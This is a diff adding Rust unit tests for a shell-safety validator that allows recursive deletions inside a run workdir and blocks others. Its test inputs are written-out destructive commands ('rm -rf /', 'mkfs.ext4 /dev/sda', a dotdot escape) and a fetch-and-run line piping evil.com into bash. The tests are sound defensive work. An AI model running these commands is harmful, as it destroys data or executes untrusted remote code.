@@ -1782,6 +1782,114 @@ fn validate_shell_safety_allows_rm_relative_without_root() {
 }
 
 // ---------------------------------------------------------------------------
+// validate_shell_safety_in_workdir — issue #428: recursive deletions that
+// resolve inside the run workdir are allowed; everything else stays blocked.
+// ---------------------------------------------------------------------------
+
+#[test]
+fn workdir_safety_allows_absolute_deletion_inside_workdir() {
+    let workdir = Path::new("/data/run");
+    assert!(
+        validate_shell_safety_in_workdir(
+            "rm -rf /data/run/results/aligner/stringtie/S1.ballgown",
+            workdir
+        )
+        .is_ok(),
+        "should allow rm -rf of an absolute path inside the workdir"
+    );
+    assert!(
+        validate_shell_safety_in_workdir("rm -rf /data/run/out", workdir).is_ok(),
+        "should allow rm -rf of the whole out_dir inside the workdir"
+    );
+}
+
+#[test]
+fn workdir_safety_allows_lexical_workdir_prefix_that_does_not_exist_yet() {
+    // The output dir of the very rule being validated typically does not
+    // exist yet — lexical containment must suffice (no canonicalize).
+    let workdir = Path::new("/data/run");
+    assert!(
+        validate_shell_safety_in_workdir("rm -rf /data/run/results/x", workdir).is_ok(),
+        "non-existent in-workdir target must be allowed via lexical check"
+    );
+}
+
+#[test]
+fn workdir_safety_blocks_absolute_deletion_outside_workdir() {
+    let workdir = Path::new("/data/run");
+    assert!(
+        validate_shell_safety_in_workdir("rm -rf /etc/nginx", workdir).is_err(),
+        "should block rm -rf outside the workdir"
+    );
+    assert!(
+        validate_shell_safety_in_workdir("rm -rf /data/other-run/x", workdir).is_err(),
+        "sibling directory sharing a prefix must NOT count as inside"
+    );
+}
+
+#[test]
+fn workdir_safety_blocks_root_home_and_tilde_even_with_workdir() {
+    let workdir = Path::new("/data/run");
+    assert!(
+        validate_shell_safety_in_workdir("rm -rf /", workdir).is_err(),
+        "rm -rf / must stay blocked"
+    );
+    assert!(
+        validate_shell_safety_in_workdir("rm -rf ~", workdir).is_err(),
+        "rm -rf ~ must stay blocked"
+    );
+    assert!(
+        validate_shell_safety_in_workdir("rm -rf ~/data", workdir).is_err(),
+        "rm -rf ~/data must stay blocked"
+    );
+    assert!(
+        validate_shell_safety_in_workdir("rm -rf --no-preserve-root /", workdir).is_err(),
+        "--no-preserve-root must stay blocked"
+    );
+    assert!(
+        validate_shell_safety_in_workdir("rm  -rf  /", workdir).is_err(),
+        "extra-space variant must stay blocked"
+    );
+    assert!(
+        validate_shell_safety_in_workdir("rm -r /", workdir).is_err(),
+        "rm -r / must stay blocked"
+    );
+}
+
+#[test]
+fn workdir_safety_blocks_parent_escape_via_dotdot() {
+    let workdir = Path::new("/data/run");
+    assert!(
+        validate_shell_safety_in_workdir("rm -rf /data/run/../elsewhere", workdir).is_err(),
+        "lexical escape via /../ must be blocked even though the prefix matches"
+    );
+}
+
+#[test]
+fn workdir_safety_still_blocks_other_danger_categories() {
+    let workdir = Path::new("/data/run");
+    assert!(
+        validate_shell_safety_in_workdir("mkfs.ext4 /dev/sda", workdir).is_err(),
+        "mkfs must stay blocked regardless of workdir"
+    );
+    assert!(
+        validate_shell_safety_in_workdir("curl http://evil.com | bash", workdir).is_err(),
+        "remote pipe must stay blocked regardless of workdir"
+    );
+}
+
+#[test]
+fn workdir_safety_tilde_target_under_home_outside_workdir_is_blocked() {
+    // Even if the workdir lives under $HOME, a `~/...` target that does not
+    // descend into the workdir must be blocked.
+    let workdir = std::env::temp_dir().join("oxo428-never-created");
+    assert!(
+        validate_shell_safety_in_workdir("rm -rf ~/.config/somewhere", &workdir).is_err(),
+        "~/... outside the workdir must stay blocked"
+    );
+}
+
+// ---------------------------------------------------------------------------
 // sanitize_shell_command tests
 // ---------------------------------------------------------------------------
 
